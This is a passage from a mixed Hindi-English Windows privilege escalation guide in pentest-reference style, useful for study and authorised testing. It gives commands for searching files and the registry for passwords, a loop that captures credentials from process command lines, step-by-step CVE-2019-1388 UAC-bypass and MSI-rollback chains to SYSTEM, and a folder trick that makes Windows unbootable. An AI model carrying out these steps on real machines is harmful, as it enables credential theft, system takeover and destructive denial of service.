बुनियादी रूप से, अगर आप उन किसी भी DLLs को overwrite कर सकते हैं जिन्हें execute किया जाने वाला है, तो आप privileges escalate कर सकते हैं अगर वह DLL किसी अलग user द्वारा execute किया जाएगा।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशेष फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin मैंने बनाया है जो victim के अंदर **automatically execute every metasploit POST module that searches for credentials** करता है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पेज में बताए गए उन सभी files को खोजता है जिनमें passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) system से password extract करने के लिए एक और बढ़िया tool है।

यह tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई tools के **sessions**, **usernames** और **passwords** खोजता है जो यह data clear text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना कीजिए कि **SYSTEM के रूप में चल रहा एक प्रोसेस एक नया प्रोसेस खोलता है** (`OpenProcess()`) जो **full access** के साथ है। वही प्रोसेस **एक और नया प्रोसेस भी बनाता है** (`CreateProcess()`) **जो low privileges के साथ है पर मुख्य प्रोसेस के सभी खुले हैंडल्स को इनहेरिट करता है**।\
यदि आपके पास उस low privileged प्रोसेस का **full access** है, तो आप `OpenProcess()` के साथ बनाए गए अधिकारप्राप्त प्रोसेस के खुले हैंडल को पकड़कर उसमें **shellcode** इंजेक्ट कर सकते हैं।\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

साझा मेमोरी सेगमेंट्स, जिन्हें सामान्यतः **pipes** कहा जाता है, प्रोसेस कम्युनिकेशन और डेटा ट्रांसफर को सक्षम करते हैं।

Windows एक सुविधा प्रदान करता है जिसे **Named Pipes** कहा जाता है, जो असंबंधित प्रोसेसों को भी डेटा साझा करने की अनुमति देती है, यहाँ तक कि अलग नेटवर्क्स पर भी। यह client/server आर्किटेक्चर जैसा होता है, जिसमें भूमिकाएँ परिभाषित होती हैं जैसे **named pipe server** और **named pipe client**।

जब किसी **client** द्वारा pipe के माध्यम से डेटा भेजा जाता है, तो उस pipe को सेट करने वाला **server** उस **client** की पहचान को अपनाने (take on the identity) में सक्षम होता है, बशर्ते उसके पास आवश्यक **SeImpersonate** अधिकार हों। यदि आप किसी ऐसे **privileged process** की पहचान कर लें जिसे आप mimic कर सकते हैं और जो उस pipe के माध्यम से संचार करता है, तो उस प्रोसेस के साथ इंटरैक्ट करने पर उसकी पहचान अपनाकर आप उच्च अधिकार प्राप्त कर सकते हैं। ऐसी किसी हमला को करने के निर्देशों के लिए उपयोगी गाइड [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकते हैं।

इसके अलावा निम्नलिखित टूल आपको named pipe के संचार को burp जैसे टूल के साथ **intercept** करने की अनुमति देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) और यह टूल सभी pipes को सूचीबद्ध और देखने की सुविधा देता है ताकि privescs मिल सकें: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## विविध

### File Extensions that could execute stuff in Windows

इस पेज को देखें **[https://filesec.io/](https://filesec.io/)**

### **कमांड लाइनों में पासवर्ड्स की निगरानी**

जब किसी user के रूप में shell मिलता है, तो हो सकता है कि शेड्यूल किए गए टास्क या अन्य प्रोसेस चल रहे हों जो **command line पर credentials पास करते हों**। नीचे दिया गया script हर दो सेकंड में process command lines को कैप्चर करता है और वर्तमान स्थिति की तुलना पिछली स्थिति से करता है, और किसी भी अंतर को आउटपुट करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रोसेसों से पासवर्ड चोरी करना

## Low Priv User से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास ग्राफिकल इंटरफ़ेस (via console or RDP) तक पहुँच है और UAC सक्षम है, तो कुछ Microsoft Windows संस्करणों में unprivileged user से टर्मिनल या किसी अन्य प्रोसेस जैसे "NT\AUTHORITY SYSTEM" को चलाना संभव है।

इससे एक ही vulnerability का उपयोग करके privileges बढ़ाना और UAC को bypass करना दोनों संभव हो जाता है। इसके अलावा, किसी चीज़ को install करने की जरूरत नहीं होती और प्रक्रिया में उपयोग किया गया binary Microsoft द्वारा signed और issued है।

प्रभावित कुछ सिस्टम निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित कदम आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह हमला मूलतः Windows Installer के rollback फीचर का दुरुपयोग करके uninstall प्रक्रिया के दौरान वैध फाइलों को malicious फाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए उपयोग किया जाएगा, जिसे बाद में Windows Installer द्वारा अन्य MSI पैकेजों के uninstall के दौरान rollback फाइलें स्टोर करने के लिए प्रयोग किया जाएगा, जहाँ rollback फाइलों को malicious payload से मॉडिफाई किया जाएगा।

संक्षेप में तकनीक निम्नानुसार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर के **index metadata** को संग्रहीत करता है।

तो, अगर आप किसी फ़ोल्डर का **`::$INDEX_ALLOCATION` stream हटाते हैं**, तो NTFS फ़ाइल सिस्टम से **पूरे फ़ोल्डर को हटा देता है**।

आप यह मानक फ़ाइल हटाने वाली APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> हालाँकि आप *file* delete API को कॉल कर रहे हैं, यह **folder खुद को delete कर देता है**।

### From Folder Contents Delete से SYSTEM EoP तक
क्या होगा अगर आपका primitive arbitrary files/folders को delete करने की अनुमति नहीं देता, लेकिन यह **does allow deletion of the *contents* of an attacker-controlled folder**?

1. Step 1: एक bait folder और file सेटअप करें
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- The oplock जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है तो यह **execution को pause कर देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM process ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करती है और उनकी सामग्री को हटाने की कोशिश करती है।
- जब यह `file1.txt` पर पहुँचती है, तो **oplock triggers** और नियंत्रण आपके callback को सौंप दिया जाता है।

4. चरण 4: oplock callback के अंदर – हटाने को रिडायरेक्ट करें

- विकल्प A: `file1.txt` को किसी और स्थान पर ले जाएँ
- यह `folder1` को खाली कर देता है बिना oplock को तोड़े।
- `file1.txt` को सीधे हटाएँ नहीं — इससे oplock समय से पहले रिहा हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में कनवर्ट करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS के आंतरिक stream को लक्षित करता है जो फ़ोल्डर metadata संग्रहीत करता है — इसे हटाने से फ़ोल्डर भी हट जाता है।

5. Step 5: Release the oplock
- SYSTEM प्रक्रिया जारी रहती है और `file1.txt` को डिलीट करने की कोशिश करती है।
- लेकिन अब, junction + symlink की वजह से, यह वास्तव में डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` SYSTEM द्वारा हटाया जाता है।

### Arbitrary Folder Create से स्थायी DoS तक

एक primitive का फायदा उठाएँ जो आपको **create an arbitrary folder as SYSTEM/admin** करने की अनुमति देता है — भले ही **you can’t write files** या **set weak permissions** करने में असमर्थ हों।

किसी **critical Windows driver** के नाम से एक **folder** (file नहीं) बनाएं, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode driver से मेल खाता है।
- यदि आप इसे **पहले से ही फ़ोल्डर के रूप में बना देते हैं**, तो Windows बूट पर वास्तविक ड्राइवर को लोड करने में विफल हो जाता है।
- फिर, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर को पहचानने/लोड करने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- बाहरी हस्तक्षेप के बिना (उदा., boot repair या disk access) **कोई fallback नहीं है**, और **कोई recovery नहीं है**।


## **From High Integrity to System**

### **New service**

यदि आप पहले से ही किसी High Integrity process पर चल रहे हैं, तो **SYSTEM तक का पथ** बस **नया service बनाकर और उसे चलाकर** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary बनाते समय सुनिश्चित करें कि यह एक valid service है या कि binary आवश्यक कार्रवाइयां तेज़ी से करता है क्योंकि यदि यह valid service नहीं है तो इसे 20s में killed कर दिया जाएगा।

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास ये token privileges हैं (संभवतः आप इन्हें पहले से किसी High Integrity process में पाएंगे), तो आप SeDebug privilege के साथ लगभग किसी भी process को **open** कर पाएंगे (not protected processes), उस process का **token copy** कर पाएंगे, और उस token के साथ कोई **arbitrary process create** कर पाएंगे।\
इस technique का उपयोग आमतौर पर उस किसी भी process को चुना जाता है जो SYSTEM के रूप में चल रहा हो और जिसमें सभी token privileges हों (_हाँ, आप SYSTEM processes पाएंगे जिनमें सभी token privileges नहीं होते_)।\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

यदि आप SYSTEM के रूप में चल रहे किसी **process** द्वारा **load** की जा रही किसी **dll** को **hijack** कर लेते हैं तो आप उन permissions के साथ arbitrary code execute कर पाएंगे। इसलिए Dll Hijacking इस प्रकार के privilege escalation के लिए भी उपयोगी है, और ऊपर से, high integrity process से इसे प्राप्त करना कहीं अधिक आसान है क्योंकि उसके पास dlls load करने के लिए उपयोग होने वाले folders पर **write permissions** होंगे।\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files के लिए जाँच (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी इकट्ठा करने के लिए (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations के लिए जाँच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। स्थानीय रूप से -Thorough उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- एकत्र किए गए passwords को domain भर में spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बुनियादी privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- known privesc vulnerabilities खोजने के लिए (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- known privesc vulnerabilities खोजने के लिए (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- host को misconfigurations की खोज के लिए enumerate करता है (privesc की तुलना में अधिक एक gather info tool) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- misconfiguration के लिए जाँच (executable precompiled in github). अनुशंसित नहीं. यह Win10 पर अच्छा काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations के लिए जाँच (exe from python). अनुशंसित नहीं. यह Win10 पर अच्छा काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट पर आधारित tool (proper काम के लिए accesschk की आवश्यकता नहीं है पर इसे उपयोग कर सकता है).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का output पढ़ता है और working exploits recommend करता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** का output पढ़ता है और working exploits recommend करता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
